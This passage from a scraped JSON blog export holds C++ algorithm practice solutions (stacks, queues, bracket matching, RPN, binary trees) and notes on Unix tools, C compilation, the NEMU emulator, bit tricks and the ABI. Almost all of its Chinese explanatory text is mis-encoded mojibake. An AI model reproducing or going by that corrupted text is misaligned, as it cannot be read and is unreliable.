(ransomNote.length() == 0) { return true; } return false; } }; é‡åˆ°ç›¸åŒçš„å­—ç¬¦ï¼Œå°±æŠŠransomNoteä¸­çš„å­—ç¬¦åˆ é™¤ï¼Œå¦‚æœæœ€åransomNoteä¸º0ï¼Œåˆ™è¿”å›true\næ³•äºŒï¼šå“ˆå¸Œè¡¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class Solution { public: bool canConstruct(string ransomNote, string magazine) { int record[26] = {0}; //add if (ransomNote.size() \u0026gt; magazine.size()) { return false; } for (int i = 0; i \u0026lt; magazine.length(); i++) { // é€šè¿‡recordæ•°æ®è®°å½• magazineé‡Œå„ä¸ªå­—ç¬¦å‡ºç°æ¬¡æ•° record[magazine[i]-\u0026#39;a\u0026#39;] ++; } for (int j = 0; j \u0026lt; ransomNote.length(); j++) { // éå†ransomNoteï¼Œåœ¨recordé‡Œå¯¹åº”çš„å­—ç¬¦ä¸ªæ•°åš--æ“ä½œ record[ransomNote[j]-\u0026#39;a\u0026#39;]--; // å¦‚æœå°äºé›¶è¯´æ˜ransomNoteé‡Œå‡ºç°çš„å­—ç¬¦ï¼Œmagazineæ²¡æœ‰ if(record[ransomNote[j]-\u0026#39;a\u0026#39;] \u0026lt; 0) { return false; } } return true; } }; QAï¼šä¸ºä»€ä¹ˆç”¨æ•°ç»„è€Œä¸æ˜¯mapï¼Ÿ\nmapè¦ç»´æŠ¤çº¢é»‘æ ‘æˆ–å“ˆå¸Œè¡¨ï¼Œç©ºé—´æ¶ˆè€—æ›´å¤§\næ ˆä¸é˜Ÿåˆ— ç”¨æ ˆå®ç°é˜Ÿåˆ— è¦æœ‰ä¸¤ä¸ªæ ˆï¼Œä¸€ä¸ªInï¼Œä¸€ä¸ªOutï¼Œç»ˆç‚¹åˆ é™¤å…ƒç´ ï¼Œå…ˆæŠŠInæ ˆé‡Œé¢çš„pushåˆ°Outæ ˆä¸­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 class MyQueue { public: stack\u0026lt;int\u0026gt; stIn; stack\u0026lt;int\u0026gt; stOut; MyQueue() { } void push(int x) { stIn.push(x); } int pop() {//å°†é˜Ÿåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ç§»é™¤ï¼Œå¹¶ä¸”è¿”å›è¿™ä¸ªå…ƒç´  if(stOut.empty()){ while(!stIn.empty()){ stOut.push(stIn.top()); stIn.pop(); } } int result = stOut.top(); stOut.pop(); return result; } int peek() {//get the front element int res = this-\u0026gt;pop();//å¯¹å½“å‰å¯¹è±¡è°ƒç”¨pop() stOut.push(res);//pop()å¼¹å‡ºäº†å…ƒç´ resï¼Œç°åœ¨å†æ·»åŠ å›å»ï¼Œä¸æ”¹å˜ return res; } bool empty() { return stIn.empty()\u0026amp;\u0026amp;stOut.empty(); } }; ç”¨é˜Ÿåˆ—å®ç°æ ˆ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 class MyStack { public: queue\u0026lt;int\u0026gt; que1; queue\u0026lt;int\u0026gt; que2; MyStack() { } void push(int x) { que1.push(x); } int pop() { int size = que1.size(); size--; while(size--){//å°†que1å¯¼å…¥que2ï¼Œä½†è¦ç•™ä¸‹æœ€åä¸€ä¸ªå…ƒç´  que2.push(que1.front()); que1.pop(); } int result = que1.front();//ç•™ä¸‹çš„æœ€åä¸€ä¸ªå…ƒç´ å°±æ˜¯è¦è¿”å›çš„å€¼ que1.pop(); que1 = que2; while(!que2.empty()){//æ¸…ç©ºque2ï¼Œque2ç›¸å½“äºä¸€ä¸ªå·¥å…·äº† que2.pop(); } return result; } int top() { int size = que1.size(); size--; while(size--){//å°†que1å¯¼å…¥que2ï¼Œä½†è¦ç•™ä¸‹æœ€åä¸€ä¸ªå…ƒç´  que2.push(que1.front()); que1.pop(); } int result = que1.front(); que2.push(que1.front());//è·å–å€¼åå°†æœ€åä¸€ä¸ªå…ƒç´ ä¹ŸåŠ å…¥que2ä¸­ï¼Œä¿æŒåŸæœ¬çš„ç»“æ„ä¸å˜ que1.pop(); que1=que2; while(!que2.empty()){ que2.pop(); } return result; } bool empty() { return que1.empty(); } }; æ€»çš„æ€æƒ³å°±æ˜¯æŠŠque1å¯¼å…¥que2ï¼Œä½†è¦ç•™ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå­˜å‚¨è¿™ä¸ªå…ƒç´ ï¼Œç„¶åå¯¹è¿™ä¸ªå…ƒç´ æ“ä½œ/ä¸æ“ä½œï¼Œæ¢å¤åŸæ¥çš„é˜Ÿåˆ—ï¼Œque2ç›¸å½“äºä¸€ä¸ªæ¡¥æ¢å·¥å…·\nåŒ¹é…æ‹¬å· 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Solution { public: bool isValid(string s) { if(s.size()%2!=0)return false;//å¦‚æœé•¿åº¦ä¸ºå¥‡æ•°ï¼Œä¸€å®šä¸ç¬¦åˆè¦æ±‚ stack\u0026lt;char\u0026gt; st; for(int i = 0;i\u0026lt;s.size();i++){ if(s[i]==\u0026#39;(\u0026#39;) st.push(\u0026#39;)\u0026#39;); else if(s[i]==\u0026#39;{\u0026#39;) st.push(\u0026#39;}\u0026#39;); else if (s[i]==\u0026#39;[\u0026#39;) st.push(\u0026#39;]\u0026#39;); //éå†å·¦æ‹¬å·ï¼Œæ£€æŸ¥st else if (st.empty()|| st.top()!=s[i]) return false;//å¦‚æœè¿˜åœ¨éå†ï¼Œstå·²ç»ä¸ºç©ºï¼Œæˆ–è€…éå†æ‰¾ä¸åˆ°ä¸åŒ¹é… else st.pop();//st.top()ä¸s[i]ç›¸ç­‰ï¼Œæ ˆå¼¹å‡ºå…ƒç´  } return st.empty(); } }; ç»å…¸é¢˜äº†ï¼Œsæœ‰åšå·¦æ‹¬å·å°±æ”¾å…¥stç›¸åº”çš„å³æ‹¬å·ï¼Œsæœ‰å³æ‹¬å·å°±æ£€æŸ¥stä¸­æœ‰æ— ä¸€æ ·çš„å³æ‹¬å·\né€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼ å±•ç¤ºäº†è®¡ç®—æœºå¦‚ä½•æ€è€ƒï¼Œå¦‚æœæ˜¯ä¸­ç¼€è¡¨è¾¾å¼ï¼Œè®¡ç®—æœºå¾—å…ˆä»å·¦åˆ°å³éå†ä¸€éå†æŒ‰å›è¿‡å¤´æ¥ä¼˜å…ˆçº§ï¼Œå¦‚ ( 1 + 2 ) * ( 3 + 4 ) ï¼Œä½†å¦‚æœæ˜¯åç¼€è¡¨è¾¾å¼åŠ ä¸åŠ æ‹¬å·æ— æ‰€è°“å› ä¸ºé¡ºåºå°±æ˜¯ä»å·¦å¾€å³ï¼Œå¦‚ ( ( 1 2 + ) ( 3 4 + ) * )\næ€è€ƒï¼šæŠŠtokensé‡Œé¢çš„æ•°å­—å…¥æ ˆï¼Œé‡åˆ°è¿ç®—ç¬¦ä¸å…¥æ ˆï¼ŒæŠŠæ ˆé‡Œé¢çš„ä¸¤ä¸ªæ•°å­—å–å‡ºæ¥ï¼Œåè¿‡æ¥åšè¿ç®—ï¼Œå†æŠŠè¿™ä¸ªæ•°å­—å…¥æ ˆ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 class Solution { public: int evalRPN(vector\u0026lt;string\u0026gt;\u0026amp; tokens) { stack\u0026lt;long long\u0026gt; st; for(int i=0;i\u0026lt;tokens.size();i++){ if(tokens[i]==\u0026#34;+\u0026#34;||tokens[i]==\u0026#34;-\u0026#34;||tokens[i]==\u0026#34;*\u0026#34;||tokens[i]==\u0026#34;/\u0026#34;){ long long num1 = st.top(); st.pop(); long long num2 = st.top(); st.pop(); if(tokens[i]==\u0026#34;+\u0026#34;) st.push(num2+num1); if(tokens[i]==\u0026#34;-\u0026#34;) st.push(num2-num1); if(tokens[i]==\u0026#34;*\u0026#34;) st.push(num2*num1); if(tokens[i]==\u0026#34;/\u0026#34;) st.push(num2/num1); }else{ st.push(stoll(tokens[i]));//stoll()å°†å‡½æ•°è½¬æ¢æˆlong long int } } auto result = st.top(); return result; } }; äºŒå‰æ ‘ 1 2 3 4 5 6 struct TreeNode { int val; TreeNode *left; TreeNode *right; TreeNode(int x):val(x),left(NULL),right(NULL){} } é€’å½’éå† å‰åºï¼šä¸­å·¦å³\nä¸­åºï¼šå·¦ä¸­å³\nååºï¼šå·¦å³ä¸­\näºŒå‰æ ‘çš„ç›´å¾„ ç»™ä½ ä¸€æ£µäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œè¿”å›è¯¥æ ‘çš„ ç›´å¾„ ã€‚\näºŒå‰æ ‘çš„ ç›´å¾„ æ˜¯æŒ‡æ ‘ä¸­ä»»æ„ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´æœ€é•¿è·¯å¾„çš„ é•¿åº¦ ã€‚è¿™æ¡è·¯å¾„å¯èƒ½ç»è¿‡ä¹Ÿå¯èƒ½ä¸ç»è¿‡æ ¹èŠ‚ç‚¹ root ã€‚\nä¸¤èŠ‚ç‚¹ä¹‹é—´è·¯å¾„çš„ é•¿åº¦ ç”±å®ƒä»¬ä¹‹é—´è¾¹æ•°è¡¨ç¤ºã€‚\næ€è·¯ï¼šä¸€ä¸ªèŠ‚ç‚¹ä¸ºèµ·ç‚¹çš„ç»è¿‡èŠ‚ç‚¹æ•°çš„æœ€å¤§å€¼ä¸ºdnï¼Œé‚£ä¹ˆäºŒå‰æ ‘çš„ç›´å¾„å°±æ˜¯æ‰€æœ‰èŠ‚ç‚¹dnçš„æœ€å¤§å€¼å‡ä¸€\nå­æ ‘æ·±åº¦ä¸ºmax(L,R)\ndnä¸ºL+R+1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution { int ans; int depth(TreeNode* rt){ if(rt == NULL){ return 0; } int L=depth(rt-\u0026gt;left);//å·¦å„¿å­ä¸ºæ ¹çš„å­æ ‘çš„æ·±åº¦ int R=depth(rt-\u0026gt;right);//å³äºŒå­ä¸ºæ ¹çš„å­æ ‘çš„æ·±åº¦ ans = max(ans,L+R+1);//æ›´æ–°è®¡ç®—ans return max(L,R)+1;//è¿”å›è¯¥èŠ‚ç‚¹ä¸ºæ ¹çš„å­æ ‘çš„æ·±åº¦ } public: int diameterOfBinaryTree(TreeNode* root) { ans =1; depth(root); return ans-1; } }; ç¿»è½¬äºŒå‰æ ‘ 1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution { public: TreeNode* invertTree(TreeNode* root) { if(root == NULL){ return 0; } TreeNode* L = invertTree(root-\u0026gt;left); TreeNode* R = invertTree(root-\u0026gt;right); root-\u0026gt;left = R; root-\u0026gt;right = L; return root; } }; ","date":"2025-03-21T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/","title":"æ•°æ®ç»“æ„ä¸ç®—æ³•"},{"content":"Unix is a user-friendly. It\u0026rsquo;s just selective about who its friends are.\nUnixå“²å­¦ KISSï¼šKeep it simple,stupid.\nEverything is a file and pipeline programs to work together.\næ¯ä¸ªå·¥å…·åªåšä¸€ä»¶äº‹æƒ…ï¼Œä½†åšåˆ°æè‡´\nå°å·¥å…·ç»Ÿä¸€æ–‡æœ¬è¾“å…¥è¾“å‡ºï¼Œæ˜“äºä½¿ç”¨\nä½¿ç”¨ç®¡é“è¿›è¡Œç»„åˆ\nman -k xxx æ£€ç´¢å…³é”®å­—XXXçš„å‘½ä»¤\necho $?æŸ¥çœ‹ä¸Šä¸€æ¡æŒ‡ä»¤çš„é€€å‡ºçŠ¶æ€\ngcc -E -S -c -o\n.c -\u0026gt; .i -\u0026gt; .s -\u0026gt; .o -\u0026gt; .out\nå…ƒç¼–ç¨‹ï¼šå®šä¹‰è‡ªå·±çš„è¯­è¨€ï¼Œä½†æ˜¯ä¸ç ´åå¯è¯»æ€§\nå‡½æ•°çš„è°ƒç”¨å°±æ˜¯æ ˆçš„ç”Ÿé•¿\n.o -\u0026gt; .outå°±æ˜¯é‡å®šå‘çš„è¿‡ç¨‹ï¼Œ.oä¸çŸ¥é“æ‰€è°ƒç”¨å‡½æ•°ä½ç½®ï¼Œé“¾æ¥åå¡«å…¥å‡½æ•°åœ°å€ä¼šæœ‰åç§»\nCç¨‹åºæ‰§è¡Œçš„ä¸¤ä¸ªè§†è§’\né™æ€ï¼šC ä»£ç çš„è¿ç»­ä¸€æ®µæ€»èƒ½å¯¹åº”åˆ°ä¸€æ®µè¿ç»­çš„æœºå™¨æŒ‡ä»¤ åŠ¨æ€ï¼šC ä»£ç æ‰§è¡Œçš„çŠ¶æ€æ€»èƒ½å¯¹åº”åˆ°æœºå™¨çš„çŠ¶æ€ Segmentation faultæŠ¥é”™ï¼šå·²è¶…è¿‡è¿™å—å†…å­˜å…è®¸çš„æƒé™æ¥æ“ä½œ\nå¤§å¤šæ•°æœºå™¨é‡‡ç”¨å°ç«¯ï¼Œå®¹æ˜“å¯¹é½\nlongåœ¨32ä½ä¸Šæ˜¯4ä¸ªå­—èŠ‚ï¼Œåœ¨64ä½æ˜¯8ä¸ªå­—èŠ‚\nåªè¦æ˜¯ä¸ªæŒ‡é’ˆï¼Œ32ä½æœºå°±æ˜¯4ä¸ªå­—èŠ‚ï¼Œ64ä½å°±æ˜¯8ä¸ªå­—èŠ‚ï¼ŒæŒ‡é’ˆåœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ˜¯ä¸ªåœ°å€\n1 void (*signal (int sig, void (*func)(int)))(int); å‚æ•°ä¸º(int sig, void (*func)(int)),*å‡½æ•°è¿”å›å€¼ï¼Œä¸ºintå‹\næ‹¿åˆ°é¡¹ç›®å makeæ„å»º\nmake runè·‘ä¸€ä¸‹\nçœ‹çœ‹Makefileæ€ä¹ˆæ„å»ºçš„\nå¤§è‡´äº†è§£ä¸‹é¡¹ç›®æ€»ä½“ç»“æ„\ntree find \u0026hellip; | xargs cat | wc â€“l å°†findæ‰¾åˆ°çš„æ–‡ä»¶åˆ—è¡¨ä¼ ç»™catï¼Œcatä¾æ¬¡è¯»å–æ–‡ä»¶å†…å®¹ï¼Œwc -lç»Ÿè®¡æ‰€æœ‰æ–‡ä»¶çš„æ€»è¡Œæ•°\n1 find . -name \u0026#34;*.c\u0026#34; -o -name \u0026#34;*.h\u0026#34; | xargs cat | wc -l 266807\næ‰¾åˆ°å…¥å£ç‚¹main\n1 grep -n main $(find . -name \u0026#34;*.c\u0026#34;) 1 grep -nr \u0026#34;\\bmain\\b\u0026#34; nemu/src æ­£åˆ™è¡¨è¾¾å¼ï¼Œmainä»¥å•è¯å½¢å¼å‡ºç°\nvim $(fzf)å¯ä»¥ä»¥æ ‘çš„æ–¹å¼ç›´æ¥è·³è½¬æŸä¸ªæ–‡ä»¶\n(gdb)layout src :æ‰“å¼€æºç \nä¸¤ç§è¿è¡Œæ–¹å¼\nmake run ./build/riscv32-nemu-interpreter æ€ä¹ˆç»™nemuä¼ æŒ‡ä»¤\necho \u0026lsquo;help\u0026rsquo; | ./build/riscv32-nemu-interpreter cat in.txt | ./build/riscv32-nemu-interpreter ./build/riscv32-nemu-interpreter \u0026lt; in.txt å›å½’æµ‹è¯•çš„è„šæœ¬ï¼Ÿ\nparse_args()å‡½æ•°ï¼Œè§£æå‘½ä»¤è¡Œå‚æ•°\n1 2 3 4 5 6 7 8 9 10 static int parse_args(int argc, char *argv[]) { const struct option table[] = { {\u0026#34;batch\u0026#34; , no_argument , NULL, \u0026#39;b\u0026#39;}, {\u0026#34;log\u0026#34; , required_argument, NULL, \u0026#39;l\u0026#39;}, {\u0026#34;diff\u0026#34; , required_argument, NULL, \u0026#39;d\u0026#39;}, {\u0026#34;port\u0026#34; , required_argument, NULL, \u0026#39;p\u0026#39;}, {\u0026#34;help\u0026#34; , no_argument , NULL, \u0026#39;h\u0026#39;}, {0 , 0 , NULL, 0 }, }; int o; static\nå¦‚æœåœ¨ä¸¤ä¸ªæ–‡ä»¶é‡Œå®šä¹‰äº†é‡åçš„å‡½æ•°ï¼Œèƒ½å¤Ÿåˆ†åˆ«ç™¾è¡²è¡£ï¼Œä½†é“¾æ¥ä¼šå‡ºé”™ï¼ŒåŠ äº†ä¸€ä¸ªstaticï¼Œçº¦æŸå¯è§çš„èŒƒå›´ï¼Œä½¿ä¸ä¼šè§¦å‘å‡½æ•°å¾—é‡åï¼Œnemuæ¡†æ¶å¾—é€»è¾‘ï¼šåªè¦æ˜¯å‡½æ•°å°±åŠ static\n/riscv32/**/reg.h\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #ifndef __RISCV_REG_H__ #define __RISCV_REG_H__ #include \u0026lt;common.h\u0026gt; static inline int check_reg_idx(int idx) { IFDEF(CONFIG_RT_CHECK, assert(idx \u0026gt;= 0 \u0026amp;\u0026amp; idx \u0026lt; MUXDEF(CONFIG_RVE, 16, 32))); return idx; } #define gpr(idx) (cpu.gpr[check_reg_idx(idx)]) static inline const char* reg_name(int idx) { extern const char* regs[]; return regs[check_reg_idx(idx)]; } #endif â€‹\nè¿è¡Œæ—¶é—´çŸ­ï¼Œä½†æ˜¯è°ƒç”¨é¢‘ç¹ï¼Œstatic inline intå»ºè®®ç¼–è¯‘å™¨ç”¨å†…è”å‡½æ•°çš„æ–¹å¼å±•å¼€ï¼Œä¸è°ƒç”¨å‡½æ•°ï¼Œè€Œæ˜¯åœ¨è°ƒç”¨ç‚¹ç›´æ¥å±•å¼€ï¼Œä»¥ç©ºé—´æ¢æ—¶é—´\nmonitor.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 void init_monitor(int argc, char *argv[]) { /* Perform some global initialization. */ /* Parse arguments. */ parse_args(argc, argv); /* Set random seed. */ init_rand(); /* Open the log file. */ init_log(log_file); /* Initialize memory. */ init_mem(); /* Initialize devices. */ IFDEF(CONFIG_DEVICE, init_device()); /* Perform ISA dependent initialization. */ init_isa(); /* Load the image to memory. This will overwrite the built-in image. */ long img_size = load_img(); /* Initialize differential testing. */ init_difftest(diff_so_file, img_size, difftest_port); /* Initialize the simple debugger. */ init_sdb(); IFDEF(CONFIG_ITRACE, init_disasm()); /* Display welcome message. */ welcome(); } äººæœºäº¤äº’ï¼Œä»¥é»˜è®¤è¡Œç¼“å†²çš„æ–¹å¼äº¤äº’ï¼Œæ²¡æœ‰æ¢è¡Œç¬¦æ˜¯ä¸ä¼šè¿›è¡ŒI/Oäº¤äº’ï¼Œæ¯è¯»åˆ°ä¸€ä¸ªæ¢è¡Œç¬¦\\nï¼Œå°±ä¼šé‡Šæ”¾ç¼“å†²åŒº\n**/debug.h\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;common.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;utils.h\u0026gt; #define Log(format, ...) \\ _Log(ANSI_FMT(\u0026#34;[%s:%d %s] \u0026#34; format, ANSI_FG_BLUE) \u0026#34;\\n\u0026#34;, \\ __FILE__, __LINE__, __func__, ## __VA_ARGS__) #define Assert(cond, format, ...) \\ do { \\ if (!(cond)) { \\ MUXDEF(CONFIG_TARGET_AM, printf(ANSI_FMT(format, ANSI_FG_RED) \u0026#34;\\n\u0026#34;, ## __VA_ARGS__), \\ (fflush(stdout), fprintf(stderr, ANSI_FMT(format, ANSI_FG_RED) \u0026#34;\\n\u0026#34;, ## __VA_ARGS__))); \\ IFNDEF(CONFIG_TARGET_AM, extern FILE* log_fp; fflush(log_fp)); \\ extern void assert_fail_msg(); \\ assert_fail_msg(); \\ assert(cond); \\ } \\ } while (0) #define panic(format, ...) Assert(0, format, ## __VA_ARGS__) #define TODO() panic(\u0026#34;please implement me\u0026#34;) #endif #define assert(cond) if(!(cond)) panic(\u0026hellip;.);\nå®çš„å±•å¼€å¯èƒ½ä¼šæ‰“ä¹±è®¡ç®—çš„ä¼˜å…ˆçº§é¡ºåºï¼Œä½¿ç”¨do{}while(0)æ˜¯ä¸ºäº†é˜²æ­¢å®å±•å¼€æ‰“ç ´ã€‚\nKconfigç®¡ç†é…ç½®å®\næ•°æ®çš„æœºå™¨çº§è¡¨è¿° å¦‚ä½•å–å­—èŠ‚ï¼Ÿ\nå¦‚x=0101ï¼Œè¦æŠŠå³è¾¹ç¬¬äºŒä½å–å‡ºæ¥ï¼Œ(x\u0026raquo;1)\u0026amp;1\nå†å¦‚\n(x\u0026raquo;16)\u0026amp;11111111\nå°±æ˜¯ä¸¢æ‰ä¸ç”¨çš„ä½\näº¤æ¢é«˜/ä½16ä½((x \u0026amp; 0xFFFF)\u0026laquo;16)ï¼Œ((x\u0026raquo;16)\u0026amp;0xFFFF)\næµ‹è¯•ğ‘¥ âˆˆ ğ‘†ï¼Œ(S \u0026raquo; x) \u0026amp; 1\næ±‚ ğ‘†! = ğ‘† âˆª {ğ‘¥}ï¼ŒS | (1 \u0026laquo; x)\næ±‚|S|ï¼ŒSäºŒè¿›åˆ¶è¡¨ç¤ºæœ‰å¤šå°‘ä¸ª1\nå•æŒ‡ä»¤å¤šæ•°æ® \u0026amp;ï¼Œ|ï¼Œ~å¯¹äºæ•´æ•°é‡Œçš„æ¯ä¸€ä¸ªbitæ¥è¯´æ˜¯ç‹¬ç«‹ï¼ˆå¹¶è¡Œï¼‰çš„\nBit Set\nä»»æ„ä½ï¼Œä½è¿ç®—æ˜¯å¯¹æ‰€æœ‰bitåŒæ—¶å®Œæˆçš„ï¼Œçœç©ºé—´ï¼Œç¨‹åºæ‰§è¡Œä¸­ï¼Œå†…å­˜ä¼˜å…ˆçº§ä¸åŒï¼Œé€Ÿåº¦ä¸åŒï¼Œå¯¹cacheçš„å ç”¨æ¯”è¾ƒå°\nè¡¥ç ï¼šå„ä½å–åæœ«å°¾åŠ ä¸€\nUndefined Behaviour è­¦æƒ•æ•´æ•°æº¢å‡º\nç§»ä½æ“ä½œä¸èƒ½è¶…å‡ºæ•°æ®é•¿åº¦\nå¦‚æœæœ‰UBè¡Œä¸ºï¼Œç”¨ä¸åŒgccä¼˜åŒ–è¡Œä¸ºï¼Œè¾“å‡ºæ˜¯ä¸ç¡®å®šçš„\nå¦‚æœåœ¨è¯•å›¾è®¿é—®ä¸€å—å†…å­˜æ—¶ï¼Œè®¿é—®åˆ°è¿™å—å†…å­˜ä¹‹å¤–çš„ä¸€å—å†…å­˜ï¼Œæ¯”å¦‚æ•°ç»„è¶Šç•Œï¼Œä½†æ˜¯è¿˜æ˜¯åœ¨æ ˆä¸Šï¼Œå¯èƒ½æ˜¯é¡µçš„è¾¹ç•Œè¯»åˆ°äº†å€¼\nç¼–è¯‘å™¨ä¼˜åŒ– -fsanitize\nå¦‚ä½•å®ç°åœ¨æ¯ä¸€æ¬¡æŒ‡é’ˆè®¿é—®æ—¶ï¼Œéƒ½å¢åŠ ä¸€ä¸ªæ–­è¨€assert(obj-\u0026gt;low \u0026lt;= ptr \u0026amp;\u0026amp; ptr \u0026lt; obj-\u0026gt;high);\n1 gcc â€“fsanitize=undefined a.c \u0026amp;\u0026amp; ./a.out ABIå’Œå†…è”æ±‡ç¼– æœºå™¨å­—é•¿å¼å¤„ç†å™¨èƒ½å¤Ÿç›´æ¥è¿›è¡Œæ•´æ•°æˆ–è€…ä½è¿ç®—å¤§å°ï¼Œä»£è¡¨ä¸€ä¸ªæŒ‡é’ˆæœ€å¤šå¤šå°‘ä½\nç°åœ¨å¤„ç†å™¨ä¸€èˆ¬å®ç°48bitç‰©ç†åœ°å€\næ™¶ä½“ç®¡æ˜¯ä»¥æ•°å­—é€»è¾‘ç”µè·¯å½¢å¼ï¼Œlogic unitsç»„æˆè®¡ç®—å•å…ƒï¼Œ\u0026hellip;.ï¼ŒåŒ…å«åœ¨ALUä¸­ï¼Œæ±‡ç¼–å™¨å¦‚ä½•ç¿»è¯‘ï¼Œç¡¬ä»¶å¦‚ä½•è§£è¯»01ä¸²ï¼Œè¦éµå¾ªISAåè®®\nQAï¼šåªè¦æœ‰ISAåè®®çœŸçš„è¶³å¤Ÿäº†å—ï¼Ÿ\néœ€è¦ABI\nçº¦å®šbinaryçš„è¡Œä¸º\näºŒè¿›åˆ¶æ–‡ä»¶çš„æ ¼å¼ å‡½æ•°è°ƒç”¨ï¼Œç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚printféœ€è¦å€ŸåŠ©å¤–éƒ¨çš„åº“å‡½æ•°ï¼Œå¦‚libc é“¾æ¥ï¼ŒåŠ è½½ cdeclå‡½æ•°è°ƒç”¨ caller stack frame\næ‰€æœ‰å‚æ•°éƒ½ä»¥æ•°ç»„çš„å½¢å¼ä¿å­˜åœ¨å †æ ˆä¸Šï¼Œä¾‹å­ï¼Œååºå‹æ ˆï¼Œf(x,y)ï¼Œy,x,fä»é«˜åœ°å€åˆ°ä½åœ°å€ è¿”å›åœ°å€ è·³è½¬åˆ°callee è°ƒç”¨æ–¹å¯„å­˜å™¨%eax,%ebx,%ecd,è¢«è°ƒç”¨æ–¹å¯„å­˜å™¨%ediï¼Œå…ˆå­˜ä¸‹æ¥ï¼Œå‡½æ•°é€€å‡ºæ—¶è¦æ¢å¤è°ƒç”¨å‰çš„å€¼ï¼Œè°ƒç”¨æ–¹è´Ÿè´£ååºå‹æ ˆï¼Œè¢«è°ƒç”¨æ–¹è´Ÿè´£æ‰§è¡Œå°±è¡Œ\nOSï¼Œæ ˆï¼Œ\u0026hellip;\u0026hellip;ï¼Œå †ï¼Œdataï¼Œä»£ç ï¼Œ\nPCæŒ‡å‘ä»£ç å—\nåœ¨X86ä¸Šï¼Œå¯„å­˜å™¨æ•°é‡æœ‰é™ï¼ŒåŸºäºæ ˆä¼ å‚\nä½¿ç”¨å¯„å­˜å™¨ä¼ é€’å‚æ•°ï¼šrdi,rsi,rdx,rcx,r8,r9\ncalleeå¯ä»¥éšæ„ä¿®æ”¹è¿™6ä¸ªå¯„å­˜å™¨çš„å€¼ ç¼–è¯‘å™¨æœ‰äº†æ›´å¤§çš„è°ƒåº¦ç©ºé—´ äº¤æ¢ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘çš„æ•°å­—\nI/Oè®¾å¤‡ è®¾å¤‡=ä¸€ç»„å¯„å­˜å™¨ï¼Œæ¯æ¬¡å¯ä»¥äº¤æ¢ä¸€å®šæ•°é‡çš„æ•°æ®\nè®¾å¤‡-å¤„ç†å™¨æ¥å£\nCPUé€šè¿‡PMIO.PIOè®¿é—®\nPort-mapped I/O (PMIO) //å¾ˆè€çš„åšæ³•\nCPUå’Œå†…å­˜åœ°å€åˆ†ç¦»ï¼Ÿ\nâ€¢ I/Oåœ°å€ç©ºé—´ï¼ˆportï¼‰ â€¢ CPUç›´è¿I/Oæ€»çº¿\nMemory-mapped I/O(MMIO)\nç›´è§‚:ä½¿ç”¨æ™®é€šå†…å­˜è¯»å†™æŒ‡ä»¤ å¸¦æ¥ä¸€äº›è®¾è®¡å’Œå®ç°çš„éº»çƒ¦ï¼Œç¼–è¯‘å™¨ä¼˜åŒ–ï¼Œä¹±åºæ‰§è¡Œ 80så¦‚ä½•æ‰“å°ï¼Ÿ\nä¸æ˜¯å‘é€æ•°æ®ï¼Œè€Œæ˜¯æ‰§è¡ŒæŒ‡ä»¤\nä¸¤ä¸ªç‰¹æ®Šçš„I/Oè®¾å¤‡ æ€»çº¿\nPCIæ€»çº¿åè®® CPUè¿æ¥æ€»çº¿ æ€»çº¿è¿æ¥å…¶ä»–æ€»çº¿ ä¸­æ–­æ§åˆ¶å™¨\nä¸­æ–­è®¾è®¡æ˜¯ä¸ºäº†å¼¥è¡¥I/Oè®¾å¤‡çš„é€Ÿåº¦ç¼ºé™·\nç®¡ç†å¤šä¸ªäº§ç”Ÿä¸­æ–­çš„è®¾å¤‡\næ±‡æ€»æˆä¸€ä¸ªä¸­æ–­ä¿¡å·ç»™CPU\næ”¯æŒä¸­æ–­çš„å±è”½ï¼Œä¼˜å…ˆçº§ç®¡ç†ç­‰\nä¸­æ–­=ç¡¬ä»¶é©±åŠ¨çš„å‡½æ•°è°ƒç”¨ï¼Œç›¸å½“äºåœ¨æ¯æ¡è¯­å¥åéƒ½æ’å…¥intterrupt_handler();\næ ˆå’Œå †ä¹‹é—´çš„ç©ºé—²åŒºåŸŸåšæ–‡ä»¶æ˜ å°„ï¼Œl.bc.so,mapç³»ç»Ÿè°ƒç”¨æ˜ å°„åŒæ­¥\nä¸­æ–­ï¼Œä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼ŒåŒä¸€ä¸ªCPUä¸Šå¯ä»¥åšä¸åŒä»»åŠ¡ï¼Œå¤šçº¿ç¨‹\nè¿›ç¨‹=åˆ†æ—¶å¤šçº¿ç¨‹+è™šæ‹Ÿå­˜å‚¨\né“¾æ¥ä¸åŠ è½½ 0001 0100 jmp 0100 ;å¦‚æœå‘ç”Ÿåç§»æ€ä¹ˆåŠï¼Ÿ\n0001 0000 jmp foo;å€ŸåŠ©ç¬¦å·è¡¨è·³è½¬ï¼Œæ¨¡å—åŒ–å¥½\nå¤ä¹ ä¸€ä¸‹ELFæ–‡ä»¶ï¼Ÿ å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ â€¢ ELF å¤´ 